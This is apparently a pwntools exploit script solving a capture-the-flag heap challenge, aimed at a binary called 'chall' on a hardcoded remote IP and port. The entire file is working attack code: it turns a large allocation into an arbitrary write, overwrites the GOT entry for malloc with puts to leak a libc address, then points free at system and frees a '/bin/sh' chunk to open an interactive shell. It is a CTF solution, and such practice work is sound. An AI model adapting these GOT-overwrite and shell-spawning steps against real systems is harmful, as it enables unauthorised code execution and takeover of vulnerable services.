#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall")
libc = ELF("./libc.so.6")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#ld = ELF("./")

context.binary = elf
#context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
b main
'''

domain= "161.97.155.116" 
port = 45384

def start():
    if args.REMOTE:
        return remote(domain, port)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])
r = start()

#========= exploit here ===================
leak = b""
def alloc(size):
    global leak
    r.sendline(b"1")
    r.sendlineafter(b"allocation:",str(size).encode())
    leak = r.recvuntil(b"created: ").strip().split(b"Alloc")[0]
    l = r.recvline().strip()
    return int(l)

def delete(key):
    r.sendline(b"3")
    r.sendlineafter(b"key:",str(key).encode())

def write(key,offset,payload):
    r.sendline(b"2")
    r.sendlineafter(b"key:",str(key).encode())
    r.sendlineafter(b"offset:",str(offset).encode())
    r.sendafter(b"payload:",payload)

r.recvuntil(b"you: ")
stack_leak = int(r.recvline().strip(),16)
info("STACK LEAK: " + hex(stack_leak))

# with a alloc(n) n > writable_addess + 8 we got arbitrary write
A = alloc(0x500000)
delete(A)
write(A,elf.got.malloc,p64(elf.plt.puts))

# 'malloc' --> 'puts'
# Leak libc puts address
B = alloc(elf.got.puts)

puts_addr = u64(leak.strip().ljust(8, b'\x00'))
libc.address = puts_addr - libc.symbols['puts']
system = libc.symbols['system']

# fix 'malloc'
# 'free' --> 'system'
write(A,elf.got.malloc,p64(libc.symbols['malloc']))
write(A,elf.got.free,p64(libc.symbols['system']))

C = alloc(20)
write(C,0,b"/bin/sh\x00")
delete(C)

r.interactive()
